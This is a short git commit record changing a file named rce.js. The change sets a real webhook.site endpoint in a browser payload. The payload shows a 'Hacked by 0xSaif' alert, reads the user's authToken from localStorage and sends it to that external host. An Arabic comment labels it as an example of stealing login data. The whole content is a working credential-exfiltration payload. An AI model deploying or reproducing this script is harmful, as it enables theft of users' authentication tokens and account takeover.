6bca0e35cae374d868eae57ba3456d248bf78c83
saif7829 <saifwalied21@gmail.com>
2025-07-24 16:45:45 +0300

    Update rce.js

--- rce.js
+++ rce.js
@@ -2,4 +2,4 @@
 alert("Hacked by 0xSaif 👾");
 
 // مثال: سرقة بيانات تسجيل الدخول
-fetch("https://webhook.site/your-id?local=" + encodeURIComponent(localStorage.getItem("authToken")));
+fetch("https://webhook.site/598a90e3-ecbb-459e-aa91-da522aab0004?local=" + encodeURIComponent(localStorage.getItem("authToken")));
